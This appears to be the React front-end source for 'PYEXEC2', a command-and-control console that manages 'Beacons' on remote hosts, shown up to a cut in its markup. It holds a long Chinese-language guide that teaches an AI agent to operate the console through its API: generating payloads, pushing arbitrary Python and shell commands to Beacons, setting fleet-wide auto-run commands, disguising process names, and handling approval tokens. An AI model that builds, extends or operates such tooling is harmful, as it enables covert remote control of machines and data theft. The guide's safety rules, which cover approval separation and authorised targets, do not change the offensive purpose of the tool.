import React, { useCallback, useEffect, useLayoutEffect, useMemo, useRef, useState } from 'react'
import CodeMirror from '@uiw/react-codemirror'
import { python } from '@codemirror/lang-python'
import { oneDark } from '@codemirror/theme-one-dark'
import ReactMarkdown from 'react-markdown'
import remarkGfm from 'remark-gfm'
import remarkBreaks from 'remark-breaks'

const NAV = [
  ['overview', 'Beacon', '◈'],
  ['deploy', '监听与载荷', '◉'],
  ['ai-agent', 'AI 模式', '⌁'],
  ['notebooks', '记事本', '▤'],
  ['approvals', '审批', '◷'],
  ['plugins', '插件', '⬡'],
  ['ai-guide', 'AI 教程', '✦'],
]

const AI_GUIDE_TEXT = `PYEXEC2 AI 对接教程 v1

一、当前动态环境（由本地客户端自动填写）
- 服务端控制 API: {{SERVER_URL}}
- 服务端协议: {{SERVER_SCHEME}}
- 服务端 IP / 主机: {{SERVER_HOST}}
- 服务端端口: {{SERVER_PORT}}
- 本地 Web 客户端: {{LOCAL_WEB_URL}}
- 项目目录: {{PROJECT_DIR}}
- AI 客户端路径: {{AI_CLIENT}}
- Human Token: {{HUMAN_TOKEN}}
- AI Worker Token: {{AI_WORKER_TOKEN}}
- AI Approval Token: {{AI_APPROVAL_TOKEN}}

AI 只应访问服务端的 /api/action、/api/session、/health。
/api/action 必须携带 Authorization: Bearer <Token>。

二、Token 角色
- Human Token: {{HUMAN_TOKEN}}
  人类操作，绕过审批，拥有完整管理权限。
- AI Worker Token: {{AI_WORKER_TOKEN}}
  AI 执行操作；per_action 模式下写操作会进入审批。
- AI Approval Token: {{AI_APPROVAL_TOKEN}}
  审批 AI Worker 的操作；不能审批自己创建的操作。
- AI 使用 Human Token 会破坏审批分离，不要这样做。
- 不要输出、转发或提交 Token；Token 等同控制面钥匙。

三、请求格式
POST {{SERVER_URL}}/api/action
Authorization: Bearer {{AI_WORKER_TOKEN}}
Content-Type: application/json

请求体:
{
  "action": "beacon.list",
  "args": {}
}

成功返回:
{"status":"ok","data":...}

需要审批时返回:
{"status":"approval_required","approval":{"id":"appr_xxx",...}}

错误返回:
{"status":"error","error":"..."}

四、常用只读 Action
- server.status                 查看服务端、监听器、审批模式
- server.capabilities           查看所有 Action 与角色能力
- beacon.list                   列出 Beacon；参数 include_removed=true 可包含已移除
- beacon.show                   参数 beacon_id
- task.list                     查看任务；可传 beacon_id
- task.show                     参数 task_id
- listener.list                 查看监听器
- listener.protocols            查看传输协议
- plugin.list                   查看插件；可传 kind/platform
- group.list                    查看 Beacon 分组
- auto.global.get               查看全舰队自动命令
- approval.list                 参数 status=pending/all
- approval.pending              查看待审批
- approval.show                 参数 approval_id

五、常用写 Action
- task.create                   参数 beacon_id, plugin, args
- script.run                    参数 beacon_id, source
- task.cancel                   参数 task_id
- beacon.note                   参数 beacon_id, note
- beacon.auto.set               设置单 Beacon 自动任务（兼容保留）
- beacon.auto.run               立即启动自动任务序列
- beacon.stash                  参数 beacon_id, stashed
- group.create                  参数 name, beacon_ids, batch_tasks
- group.update                  参数 group_id, name/beacon_ids/batch_tasks
- group.delete                  参数 group_id
- group.batch_dispatch          参数 group_id, tasks
- auto.global.set               设置所有 Beacon 上线时执行的全局自动命令
- payload.generate              参数 listener_id, name, settings...
- listener.create               参数 protocol, host, port, public_host
- listener.start/restart/stop/remove
- approval.approve/reject       只能由 Human 或 AI Approval Token 调用

六、常见任务流程
1. AI 先查在线 Beacon:
   {"action":"beacon.list","args":{}}
   找到 status=online 的 beacon_id。

2. 下发一个任务:
   {
     "action":"task.create",
     "args":{
       "beacon_id":"beacon_xxx",
       "plugin":"pwd",
       "args":{}
     }
   }

3. 轮询任务直到完成:
   {"action":"task.show","args":{"task_id":"task_xxx"}}
   状态流转: queued -> dispatched -> succeeded/failed/cancelled

4. 读取结果:
   succeeded 时读取 data.output 和 data.result.data
   failed 时读取 data.error
   queued 很久表示 Beacon 未回连或离线；不要谎称已执行

七、平台命令解析
- AI 不需要写 l/w 前缀，直接下发基础命令：
  pwd, ls, cat, ps, sysinfo, whoami, env,
  mkdir, rm, mv, cp, tail, tee, dd, find, grep,
  ping, nmap, exec, python, settings, tasks, killtask, upgrade, fork, masquerade
- 服务端按 Beacon.platform 自动解析：
  Linux -> l 开头实现
  Windows -> w 开头实现
- 例如 Linux Beacon 发 cd -> 实际 lcd；Windows Beacon 发 cd -> 实际 wcd

八、常用命令参数
- pwd: {}
- ls: {"path":"/tmp"}
- cat: {"path":"/etc/hosts"}
- tail: {"path":"/var/log/syslog","lines":50}
- find: {"path":"/tmp","pattern":"*.log"}
- grep: {"path":"/tmp","pattern":"error"}
- exec: {"command":"id"}
- ping: {"host":"127.0.0.1"}
- nmap: {"host":"127.0.0.1","ports":"22,80,443"}
- tasks: {}
- killtask: {"task_id":"task_xxx"}
- settings: {"fast_interval":4,"slow_interval":20,"current_interval":7,"jitter":0.1,"finish_delay":2,"max_concurrent_tasks":3}
  settings 未提供的字段保持原值
- upgrade: {"host":"192.0.2.10","port":9001,"protocol":"tcp","key":"<base64 32字节>","token":"<可选>"}
- fork: {}
- masquerade: {"new_name":"systemd"}  # Linux：伪装当前 Beacon 进程名

九、AI 审批规则
- all_allow: AI Worker 可以直接执行写操作
- per_action: AI Worker 写操作返回 approval_required
- AI Worker 不能调用 approval.approve/reject
- AI Approval Token 可以审批 AI Worker 创建的操作
- AI Approval Token 不能审批自己创建的操作
- Human Token 可审批，也可绕过审批
- 审批后服务端才真正执行原 Action

十、全舰队自动命令与分组
- auto.global.set 设置的命令对所有 Beacon 生效，不论分组
- 自动命令在 Beacon 回连时串行执行：一条完成后再取下一条
- group.batch_dispatch 是手动批量下发，只对组内当前在线 Beacon 创建普通任务
- group.batch_tasks 不会在回连时自动执行
- 分组只负责成员管理和手动批量任务

十一、文件与载荷
- 文件读取结果可能很大，服务端会分片传输并完整重组
- 文件上传使用 file.upload_chunk，每次建议 8KB 数据
- 单次 task 下发载荷有 20KB transport 限制
- 大型文件不要放在单次 task args 中，使用分片
- payload.generate 生成的载荷只在活动载荷注册表中保留
- {{SERVER_URL}}/p/<payload-token> 是载荷下载 URL，不是 AI 控制 API

十二、安全与操作边界
- 不要把 Token 放入提示词、日志、报告或聊天内容
- 不要尝试绕过审批或使用 Human Token 冒用人类
- 不要对未授权目标执行任务
- 不要移除/修改不属于当前任务范围的 Beacon 或数据
- 发现 offline、approval_required、传输错误时要明确报告，不要假装成功
- 执行破坏性命令前先确认 beacon_id、路径和参数

十三、AI 客户端命令示例
python3 {{AI_CLIENT}} --action server.status
python3 {{AI_CLIENT}} --action beacon.list
python3 {{AI_CLIENT}} --action task.create --args '{"beacon_id":"beacon_xxx","plugin":"pwd","args":{}}'
python3 {{AI_CLIENT}} --action script.run --args '{"beacon_id":"beacon_xxx","source":"print(\"hello\")\n__result__={\"ok\":true}"}'
python3 {{AI_CLIENT}} --action task.show --args '{"task_id":"task_xxx"}'
python3 {{AI_CLIENT}} --wait-task task_xxx --timeout 60
python3 {{AI_CLIENT}} --pending
python3 {{AI_CLIENT}} --approve appr_xxx
python3 {{AI_CLIENT}} --reject appr_xxx
python3 {{AI_CLIENT}} --approve-all
python3 {{AI_CLIENT}} --list-actions

十四、可直接给 AI 的提示词模板
1. “先调用 beacon.list，找出所有 online Beacon；不要猜测 ID。然后对 beacon_xxx 下发 pwd，轮询 task.show 直到 succeeded，最后只报告实际返回结果。”
2. “对 beacon_xxx 执行 ls /tmp 和 whoami。任务必须串行，第一条完成并读取结果后再下发第二条。失败时报告真实错误。”
3. “检查当前 pending 审批列表。你是 AI Approval Token：只审批 actor 为 ai 的操作，不能审批自己创建的操作。审批前先 approval.show 查看原始 Action。”
4. “创建一个名为 DMZ 的分组，把下列 Beacon 加入：...。设置手动批量下发命令 pwd、whoami，但不要把它们设置为自动执行。”
5. “调用 auto.global.get 查看全舰队自动命令。若我提供新顺序，先确认每行命令，再调用 auto.global.set 保存。说明哪些命令会在 Beacon 上线时自动执行。”
6. “对 beacon_xxx 执行 task.create plugin=settings，仅修改 fast_interval=4 和 slow_interval=20；其他设置不要修改。完成后 task.show 核对结果。”
7. “不要执行任何写操作，先只读检查 server.status、beacon.list、task.list、approval.pending，并给出系统当前状态和风险点。”
8. “如果 task.show 返回 queued 超过预期，停止轮询并说明 Beacon 可能离线或未回连；不要声称任务已执行。”
9. “先用 beacon.list 确认 beacon_xxx 在线。然后使用 script.run 下发下面这段 Python 代码，轮询 task.show 直到结束，分别报告 output、result.data 和 error，不要修改我的代码：<粘贴 Python 代码>。”
10. “把下面 Python 代码通过 script.run 下发到 beacon_xxx。代码中的 print 是 output，__result__ 是结构化结果。若返回 approval_required，停止并告诉我需要哪个审批 Token，不要尝试自行审批。”

十五、重点：AI 如何下发 Python 代码并执行

首选 Action 是 script.run，不要把多行 Python 塞进普通 shell 命令。

正确步骤：

1. 先确认 Beacon 在线
   {"action":"beacon.list","args":{}}
   只选择 status 为 online 的 beacon_id。

2. 准备 Python 源码
   源码通过 source 字段传递。
   推荐使用 print() 产生 output，使用 __result__ 传递结构化结果。
   示例源码：
   print("hello from python")
   import os
   print("cwd=", os.getcwd())
   __result__ = {"ok": True, "cwd": os.getcwd()}

3. 调用 script.run
   {
     "action":"script.run",
     "args":{
       "beacon_id":"beacon_xxx",
       "source":"print(\"hello from python\")\nimport os\nprint(\"cwd=\", os.getcwd())\n__result__={\"ok\":True,\"cwd\":os.getcwd()}"
     }
   }

   source 是 JSON 字符串，换行必须使用 \n 转义。
   不要使用反引号包裹 JSON，不要添加 JSON 注释。

4. 记录返回的 Task ID
   script.run 成功返回任务对象，读取 data.id。
   例如 task_xxx。

5. 轮询任务直到结束
   {"action":"task.show","args":{"task_id":"task_xxx"}}
   状态：queued -> dispatched -> succeeded / failed / cancelled

6. 读取执行结果
   - 标准输出：data.output
   - 结构化结果：data.result.data
   - 回溯/异常：data.error
   - 任务状态：data.status

7. 用 AI 客户端执行同一流程
   python3 {{AI_CLIENT}} --action script.run --args '{"beacon_id":"beacon_xxx","source":"print(\"hello\")\n__result__={\"ok\":true}"}'
   python3 {{AI_CLIENT}} --wait-task task_xxx --timeout 60

curl 示例：
curl -sS -X POST {{SERVER_URL}}/api/action \
  -H "Authorization: Bearer {{AI_WORKER_TOKEN}}" \
  -H "Content-Type: application/json" \
  -d '{"action":"script.run","args":{"beacon_id":"beacon_xxx","source":"print(\"hello\")\n__result__={\"ok\":true}"}}'

重要规则：
- AI 必须先把 Beacon 确认为 online，再调用 script.run。
- Python 注释会被服务端自动剥离；不要依赖注释传递运行参数。
- script.run 是异步拉取模式，必须 task.show 轮询；不要假定调用后立即完成。
- queued 状态表示 Beacon 尚未领取任务；不能报告为已执行。
- 如果返回 approval_required，说明当前是 per_action 审批：
  * AI Worker 不能自己审批
  * 必须由另一个 AI Approval Token 或 Human 审批
  * 审批后再轮询原 Task ID
- 单次任务载荷有 20KB 传输限制。
  大代码或大文件请拆分；文件内容使用 file.upload_chunk。
- 不要在 Python 代码中尝试读取或输出 Token。
- 不要把 __result__ 设成不可 JSON 序列化对象；优先使用 dict/list/str/int/bool。
- 执行完成后必须根据实际 output/error 报告，不得编造结果。

十六、结果报告格式
建议 AI 固定输出：
- 使用的 Action
- 目标 Beacon ID
- Task ID
- 最终状态
- 实际输出摘要
- 错误（如有）
- 未执行/未确认的事项
`;

class ApprovalRequiredError extends Error {
  constructor(approval) {
    super(`需要审批：${approval?.id || ''}`)
    this.name = 'ApprovalRequiredError'
    this.approval = approval
  }
}

async function action(name, args = {}) {
  const res = await fetch('/api/action', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'X-PyExec-Auth': sessionStorage.getItem('pyexec_token') || '' },
    body: JSON.stringify({ action: name, args }),
  })
  if (res.status === 401) throw new Error('Token 无效或连接被拒绝')
  const data = await res.json()
  if (data.status === 'error') throw new Error(data.error || '操作失败')
  if (data.status === 'approval_required') throw new ApprovalRequiredError(data.approval)
  return data.data
}

function PythonEditor({ value, onChange, className = '', height = '600px' }) {
  return <div className={`code-editor ${className}`}>
    <CodeMirror
      value={value}
      height={height}
      theme={oneDark}
      extensions={[python()]}
      onChange={onChange}
      basicSetup={{ lineNumbers: true, foldGutter: true, highlightActiveLine: true, bracketMatching: true, closeBrackets: true, autocompletion: true }}
    />
  </div>
}

function Banner({ text, tone = 'info' }) {
  return <div className={`banner ${tone}`}>{text}</div>
}

function Panel({ title, eyebrow, right, children, className = '' }) {
  return <section className={`panel ${className}`}>
    <div className="panel-head"><div>{eyebrow && <div className="eyebrow">{eyebrow}</div>}<h2>{title}</h2></div>{right}</div>
    {children}
  </section>
}

async function copyText(text) {
  if (navigator.clipboard && window.isSecureContext) {
    try {
      await navigator.clipboard.writeText(text)
      return true
    } catch { /* fall through to legacy clipboard */ }
  }
  const area = document.createElement('textarea')
  area.value = text
  area.setAttribute('readonly', '')
  area.style.position = 'fixed'
  area.style.opacity = '0'
  area.style.pointerEvents = 'none'
  document.body.appendChild(area)
  area.select()
  area.setSelectionRange(0, area.value.length)
  let ok = false
  try { ok = document.execCommand('copy') } catch { ok = false }
  document.body.removeChild(area)
  return ok
}

function CopyButton({ text, children = '复制' }) {
  const [state, setState] = useState('idle')
  const copy = async () => {
    const ok = await copyText(String(text || ''))
    setState(ok ? 'copied' : 'failed')
    setTimeout(() => setState('idle'), 1800)
  }
  return <button className="ghost copy-button" onClick={copy}>{state === 'copied' ? '已复制' : state === 'failed' ? '复制失败' : children}</button>
}

function Status({ status }) {
  const s = String(status || 'unknown').toLowerCase()
  return <span className={`status ${s}`}>{status || 'unknown'}</span>
}

function splitServer(server) {
  try {
    const url = new URL(server || 'http://127.0.0.1:18080')
    return { scheme: url.protocol.replace(':', '') || 'http', host: url.hostname || '127.0.0.1', port: url.port || '18080' }
  } catch {
    return { scheme: 'http', host: '127.0.0.1', port: '18080' }
  }
}

function ConfigGate({ children }) {
  const [ready, setReady] = useState(false)
  const [connected, setConnected] = useState(false)
  const [scheme, setScheme] = useState('http')
  const [host, setHost] = useState('127.0.0.1')
  const [port, setPort] = useState('18080')
  const [token, setToken] = useState('')
  const [error, setError] = useState('')
  const [busy, setBusy] = useState(false)
  useEffect(() => {
    fetch('/api/config').then(r => r.json()).then(c => {
      const parsed = splitServer(c.server)
      setScheme(parsed.scheme); setHost(parsed.host); setPort(parsed.port)
      const savedToken = sessionStorage.getItem('pyexec_token') || ''
      if (savedToken) setToken(savedToken)
      setReady(true)
    }).catch(e => { setError(e.message); setReady(true) })
  }, [])
  const connect = async (event) => {
    event.preventDefault()
    setError(''); setBusy(true)
    const server = `${scheme}://${host.trim()}:${port.trim()}`
    try {
      const check = await fetch('/api/connect', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ server, token }),
      })
      const result = await check.json()
      if (!result.ok) throw new Error(result.error || '连接失败')
      const saved = await fetch('/api/config', {
        method: 'POST', headers: { 'Content-Type': 'application/json', 'X-PyExec-Auth': token },
        body: JSON.stringify({ server, token }),
      })
      const savedResult = await saved.json()
      if (!savedResult.ok) throw new Error(savedResult.error || '本地配置保存失败')
      sessionStorage.setItem('pyexec_token', token)
      setConnected(true)
    } catch (err) { setError(err.message) } finally { setBusy(false) }
  }
  if (!ready) return <div className="config-gate"><div className="loader">正在读取本地客户端配置…</div></div>
  if (connected) return children
  return <div className="config-gate connect-gate">
    <form className="connect-form" onSubmit={connect}>
      <div className="connect-brand"><div className="brand-mark"><span>P</span><i /></div><div><strong>PYEXEC2</strong><small>SECURE LINK TERMINAL</small></div></div>
      <div className="eyebrow">LOCAL CLIENT / CONTROL LINK</div>
      <h1>建立控制链路</h1>
      <p className="dim">Web 界面仅在本地客户端运行。输入服务端 IP、端口和 Human/AI Token，验证通过后才进入驾驶舱。</p>
      <div className="connect-fields">
        <label>协议<select value={scheme} onChange={e => setScheme(e.target.value)}><option value="http">HTTP</option><option value="https">HTTPS</option></select></label>
        <label>服务端 IP / 主机<input value={host} onChange={e => setHost(e.target.value)} placeholder="192.0.2.10" autoFocus /></label>
        <label>端口<input value={port} onChange={e => setPort(e.target.value)} placeholder="18080" /></label>
      </div>
      <label>Token<input type="password" value={token} onChange={e => setToken(e.target.value)} placeholder="Human / AI / AI Approval Token" /></label>
      {error && <div className="banner error">{error}</div>}
      <button className="primary" disabled={busy}>{busy ? '验证连接中…' : '连接控制面'}</button>
      <div className="connect-hint">本地客户端 → {scheme}://{host || 'host'}:{port || 'port'} · UI 不会由服务端提供</div>
    </form>
  </div>
}

function CockpitHud({ beacons, tasks, listeners, approvals, status }) {
  const online = beacons.filter(b => b.status === 'online').length
  const activeTasks = tasks.filter(t => t.status === 'queued' || t.status === 'dispatched').length
  const listening = listeners.filter(l => l.status === 'listening').length
  const pending = (approvals || []).filter(a => a.status === 'pending').length
  const fleetPct = beacons.length ? Math.round(online / beacons.length * 100) : 0
  const taskPct = tasks.length ? Math.round(activeTasks / tasks.length * 100) : 0
  const listenerPct = listeners.length ? Math.round(listening / listeners.length * 100) : 0
  return <section className="cockpit-hud">
    <div className="radar-module">
      <div className="radar"><span className="radar-sweep" /><i className="blip b1" /><i className="blip b2" /><i className="blip b3" /><i className="blip b4" /></div>
      <div className="radar-copy"><span>TACTICAL LINK</span><strong>{online} ONLINE</strong><small>{beacons.length} BEACONS · {listening} LISTENERS</small></div>
    </div>
    <div className="hud-gauges">
      <div className="hud-gauge"><div className="gauge-ring" style={{ '--pct': fleetPct }}><span>{fleetPct}%</span></div><small>FLEET UPLINK</small></div>
      <div className="hud-gauge"><div className="gauge-ring" style={{ '--pct': listenerPct }}><span>{listenerPct}%</span></div><small>TRANSPORT</small></div>
      <div className="hud-gauge"><div className="gauge-ring" style={{ '--pct': taskPct }}><span>{taskPct}%</span></div><small>TASK LOAD</small></div>
    </div>
    <div className="hud-status">
      <div><span>SYS STATUS</span><strong className="hud-ok">NOMINAL</strong></div>
      <div><span>APPROVAL GATE</span><strong className={pending ? 'hud-warn' : 'hud-ok'}>{pending ? `${pending} PENDING` : 'CLEAR'}</strong></div>
      <div><span>COMMAND MODE</span><strong>{status?.approval_mode === 'per_action' ? 'PER ACTION' : 'ALL ALLOW'}</strong></div>
      <div><span>ENCRYPTION</span><strong className="hud-ok">AEAD ACTIVE</strong></div>
    </div>
  </section>
}

function Overview({ status, beacons, groups, globalAuto, tasks, listeners, approvals, openBeacon, refresh }) {
  const [showStashed, setShowStashed] = useState(false)
  const [dragBeaconId, setDragBeaconId] = useState('')
  const [dragOverBeaconId, setDragOverBeaconId] = useState('')
  const [noteTarget, setNoteTarget] = useState(null)
  const [noteText, setNoteText] = useState('')
  const [noteBusy, setNoteBusy] = useState(false)
  const [noteError, setNoteError] = useState('')
  const [fleetMsg, setFleetMsg] = useState('')
  const [groupFilter, setGroupFilter] = useState('all')
  const [selectedGroupId, setSelectedGroupId] = useState('')
  const [groupName, setGroupName] = useState('')
  const [groupBeaconIds, setGroupBeaconIds] = useState([])
  const [groupBatchText, setGroupBatchText] = useState('')
  const [groupMsg, setGroupMsg] = useState('')
  const [globalRows, setGlobalRows] = useState([])
  const [globalMsg, setGlobalMsg] = useState('')
  const [dragIndex, setDragIndex] = useState(-1)
  const pageRef = useRef(null)
  const pageScrollRef = useRef(0)
  const activeGroup = groups.find(g => g.id === groupFilter)
  const visibleBeacons = beacons.filter(b => !b.stashed && (groupFilter === 'all' || activeGroup?.beacon_ids?.includes(b.id)))
  const stashedBeacons = beacons.filter(b => b.stashed)
  const heartbeatAgo = (value) => {
    if (!value) return '—'
    const timestamp = Date.parse(value)
    if (Number.isNaN(timestamp)) return '—'
    const seconds = Math.max(0, Math.floor((Date.now() - timestamp) / 1000))
    if (seconds < 5) return '刚刚'
    if (seconds < 60) return `${seconds} 秒前`
    if (seconds < 3600) return `${Math.floor(seconds / 60)} 分钟前`
    if (seconds < 86400) return `${Math.floor(seconds / 3600)} 小时前`
    return `${Math.floor(seconds / 86400)} 天前`
  }

  useLayoutEffect(() => {
    const page = pageRef.current
    if (!page) return
    if (Math.abs(page.scrollTop - pageScrollRef.current) > 1) page.scrollTop = pageScrollRef.current
  }, [beacons, groups, globalAuto, tasks, listeners, approvals, status])
  const onPageScroll = (event) => { pageScrollRef.current = event.currentTarget.scrollTop }

  const loadGroupEditor = (group) => {
    setSelectedGroupId(group?.id || '')
    setGroupName(group?.name || '')
    setGroupBeaconIds(group?.beacon_ids || [])
    setGroupBatchText((group?.batch_tasks || group?.auto_tasks || []).map(t => t.command || t.plugin).join('\n'))
    setGroupMsg('')
  }
  useEffect(() => {
    if (!selectedGroupId && groups.length) loadGroupEditor(groups[0])
  }, [groups, selectedGroupId])
  useEffect(() => {
    setGlobalRows((globalAuto?.tasks || []).map(task => task.command || task.plugin))
  }, [globalAuto])

  const saveGroup = async () => {
    setGroupMsg('')
    try {
      const payload = { name: groupName.trim() || '未命名分组', beacon_ids: groupBeaconIds, batch_tasks: autoTasksFromText(groupBatchText) }
      const saved = selectedGroupId ? await action('group.update', { group_id: selectedGroupId, ...payload }) : await action('group.create', payload)
      setSelectedGroupId(saved.id)
      setGroupMsg(selectedGroupId ? '分组已更新' : '分组已创建')
      await refresh()
    } catch (err) { setGroupMsg(err.message) }
  }
  const deleteGroup = async () => {
    if (!selectedGroupId) return
    try {
      await action('group.delete', { group_id: selectedGroupId })
      setSelectedGroupId(''); setGroupName(''); setGroupBeaconIds([]); setGroupBatchText(''); setGroupMsg('分组已删除')
      if (groupFilter === selectedGroupId) setGroupFilter('all')
      await refresh()
    } catch (err) { setGroupMsg(err.message) }
  }
  const batchDispatchGroup = async () => {
    if (!selectedGroupId) { setGroupMsg('请先保存分组'); return }
    try {
      const result = await action('group.batch_dispatch', { group_id: selectedGroupId, tasks: autoTasksFromText(groupBatchText) })
      setGroupMsg(`已批量下发 ${result.created.length} 个任务${result.skipped.length ? `，跳过 ${result.skipped.length} 个离线 Beacon` : ''}`)
      await refresh()
    } catch (err) { setGroupMsg(err.message) }
  }
  const toggleGroupBeacon = (id) => setGroupBeaconIds(prev => prev.includes(id) ? prev.filter(item => item !== id) : [...prev, id])

  const updateGlobalRow = (index, value) => setGlobalRows(prev => prev.map((row, i) => i === index ? value : row))
  const addGlobalRow = () => setGlobalRows(prev => [...prev, ''])
  const removeGlobalRow = (index) => setGlobalRows(prev => prev.filter((_, i) => i !== index))
  const moveGlobalRow = (from, to) => {
    if (from === to || from < 0 || to < 0) return
    setGlobalRows(prev => {
      const copy = [...prev]
      const [item] = copy.splice(from, 1)
      copy.splice(to, 0, item)
      return copy
    })
  }
  const saveGlobalAuto = async () => {
    setGlobalMsg('')
    try {
      const saved = await action('auto.global.set', { tasks: autoTasksFromText(globalRows.join('\n')) })
      setGlobalMsg(`已保存 ${saved.tasks.length} 条全舰队自动命令，所有 Beacon 上线时执行`)
      await refresh()
    } catch (err) { setGlobalMsg(err.message) }
  }

  const reorderBeacon = async (sourceId, targetId) => {
    if (!sourceId || !targetId || sourceId === targetId) return
    const visibleIds = visibleBeacons.map(item => item.id)
    const sourceIndex = visibleIds.indexOf(sourceId)
    const targetIndex = visibleIds.indexOf(targetId)
    if (sourceIndex < 0 || targetIndex < 0) return
    const nextVisible = [...visibleIds]
    nextVisible.splice(sourceIndex, 1)
    nextVisible.splice(targetIndex, 0, sourceId)
    const allIds = beacons.filter(item => !item.stashed).map(item => item.id)
    const visibleSet = new Set(visibleIds)
    let pointer = 0
    const fullOrder = allIds.map(id => visibleSet.has(id) ? nextVisible[pointer++] : id)
    setFleetMsg('正在保存 Beacon 显示顺序…')
    try {
      await action('beacon.order.set', { beacon_ids: fullOrder })
      setFleetMsg('Beacon 显示顺序已保存')
      await refresh()
    } catch (err) { setFleetMsg(err.message) } finally {
      setDragBeaconId(''); setDragOverBeaconId('')
    }
  }

  const setStash = async (target, stashed) => {
    setFleetMsg('')
    try {
      await action('beacon.stash', { beacon_id: target.id, stashed })
      setFleetMsg(stashed ? `已收纳 ${target.hostname}` : `已恢复 ${target.hostname}`)
      await refresh()
    } catch (err) { setFleetMsg(err.message) }
  }
  const openNote = (target) => {
    setNoteTarget(target)
    setNoteText(target.note || '')
    setNoteError('')
  }
  const saveNote = async () => {
    if (!noteTarget) return
    setNoteBusy(true)
    try {
      await action('beacon.note', { beacon_id: noteTarget.id, note: noteText })
      setNoteTarget(null)
      await refresh()
    } catch (err) { setNoteError(err.message) } finally { setNoteBusy(false) }
  }

  return <div className="page" ref={pageRef} onScroll={onPageScroll}>
    <header className="page-head"><div><div className="eyebrow">BEACON FLEET / LOCAL CLIENT</div><h1>Beacon<span>_</span></h1><p>Beacon 舰队总控 · 心跳遥测 · 监听与载荷部署 · 插件化远程执行</p></div><button className="ghost" onClick={refresh}>刷新状态</button></header>
    <CockpitHud beacons={beacons} tasks={tasks} listeners={listeners} approvals={approvals} status={status} />
    <div className="metric-row">
      <div className="metric"><span>Beacon</span><strong>{visibleBeacons.length}</strong><small>{visibleBeacons.filter(b => b.status === 'online').length} online · {stashedBeacons.length} 收纳</small></div>
      <div className="metric"><span>监听器</span><strong>{status?.listeners ?? 0}</strong><small>协议插件</small></div>
      <div className="metric"><span>任务</span><strong>{tasks.length}</strong><small>{tasks.filter(t => t.status === 'queued' || t.status === 'dispatched').length} active</small></div>
      <div className="metric"><span>审批模式</span><strong className="small-value">{status?.approval_mode === 'per_action' ? '逐条审批' : '全部放行'}</strong><small>审计开启</small></div>
    </div>
    {fleetMsg && <Banner text={fleetMsg} />}
    <Panel title={showStashed ? '收纳区' : 'Beacon'} eyebrow={showStashed ? 'STASHED BEACONS' : 'FLEET'} right={<div className="quick-buttons"><select value={groupFilter} onChange={e => setGroupFilter(e.target.value)}><option value="all">全部 Beacon</option>{groups.map(group => <option key={group.id} value={group.id}>{group.name} ({group.beacon_ids?.length || 0})</option>)}</select><button className={showStashed ? 'primary' : 'ghost'} onClick={() => setShowStashed(v => !v)}>{showStashed ? '返回 Beacon' : `收纳区 ${stashedBeacons.length}`}</button></div>} className="beacon-table">
      {showStashed ? <div className="stashed-roster">
        <div className="stashed-head"><span>收纳区</span><small>{stashedBeacons.length} BEACONS</small></div>
        {stashedBeacons.map(b => <div className="stashed-row" key={b.id}>
          <button className="link stashed-host" onClick={() => openBeacon(b.id)}>{b.hostname}</button>
          <span className="stashed-user">{b.username || '—'}</span>
          <span className="mono stashed-time" title={b.last_seen || ''}>{heartbeatAgo(b.last_seen)}</span>
          <span className="stashed-note">{b.note || '无备注'}</span>
          <Status status={b.status} />
          <span className="row-actions"><button className="link" onClick={() => openNote(b)}>备注</button><button className="link" onClick={() => setStash(b, false)}>恢复</button></span>
        </div>)}
        {!stashedBeacons.length && <div className="empty">收纳区为空</div>}
      </div> : <div className="table">
        <div className="tr th"><span>主机</span><span>用户名</span><span>平台</span><span>协议</span><span>心跳间隔</span><span>状态</span><span>最后心跳</span><span>操作</span></div>
        {visibleBeacons.map(b => <div className={`tr beac-row ${dragOverBeaconId === b.id ? 'drag-over' : ''}`} key={b.id} role="button" tabIndex={0} draggable onClick={() => openBeacon(b.id)} onKeyDown={e => e.key === 'Enter' && openBeacon(b.id)} onDragStart={e => { setDragBeaconId(b.id); e.dataTransfer.effectAllowed = 'move' }} onDragOver={e => { if (dragBeaconId) { e.preventDefault(); setDragOverBeaconId(b.id) } }} onDragLeave={() => setDragOverBeaconId('')} onDrop={e => { e.preventDefault(); if (dragBeaconId) reorderBeacon(dragBeaconId, b.id) }} onDragEnd={() => { setDragBeaconId(''); setDragOverBeaconId('') }}>
          <span className="host-cell"><span className="host-line"><span className="beacon-drag-handle" title="拖动调整显示顺序">⋮⋮</span><span>{b.hostname}</span></span>{b.note && <small>{b.note}</small>}</span>
          <span>{b.username || '—'}</span><span>{b.platform}</span><span>{b.protocol}</span>
          <span className="mono">{b.heartbeat_interval != null ? `${Math.round(b.heartbeat_interval)}s` : '—'}</span>
          <span><Status status={b.status} /></span><span className="mono" title={b.last_seen || ''}>{heartbeatAgo(b.last_seen)}</span>
          <span className="row-actions"><button className="link" onClick={e => { e.stopPropagation(); openNote(b) }}>备注</button><button className="link" onClick={e => { e.stopPropagation(); setStash(b, true) }}>收纳</button></span>
        </div>)}
        {!visibleBeacons.length && <div className="empty">当前分组没有 Beacon。</div>}
      </div>}
    </Panel>

    <div className="beacon-admin-grid">
      <Panel title="分组设置" eyebrow="BEACON GROUPS">
        <div className="group-manager-inline">
          <div className="group-sidebar">
            <button className="primary" onClick={() => loadGroupEditor({ name: '新分组', beacon_ids: [], batch_tasks: [] })}>＋ 新建分组</button>
            <div className="group-list">{groups.map(group => <button key={group.id} className={`group-row ${selectedGroupId === group.id ? 'active' : ''}`} onClick={() => loadGroupEditor(group)}><strong>{group.name}</strong><small>{group.beacon_ids?.length || 0} Beacons · {(group.batch_tasks || group.auto_tasks || []).length} Batch</small></button>)}{!groups.length && <div className="empty">还没有分组</div>}</div>
          </div>
          <div className="group-editor">
            <label className="group-field">分组名称<input value={groupName} onChange={e => setGroupName(e.target.value)} placeholder="例如：生产区 / DMZ / 财务终端" /></label>
            <div className="group-field"><span>加入分组的 Beacon</span><div className="group-beacon-picker">{beacons.map(beacon => <label key={beacon.id}><input type="checkbox" checked={groupBeaconIds.includes(beacon.id)} onChange={() => toggleGroupBeacon(beacon.id)} /><span className="group-beacon-label"><strong>{beacon.hostname}</strong><em>{beacon.note || '无备注'}</em></span><small>{beacon.platform} · {beacon.status}</small></label>)}</div></div>
            <label className="group-field">批量下发命令（每行一条）<textarea value={groupBatchText} onChange={e => setGroupBatchText(e.target.value)} placeholder={"pwd\nls /tmp\nwhoami"} /></label>
            <div className="hint">分组只负责成员管理和手动批量下发；所有 Beacon 的自动命令在右侧统一设置。</div>
            {groupMsg && <div className="banner info">{groupMsg}</div>}
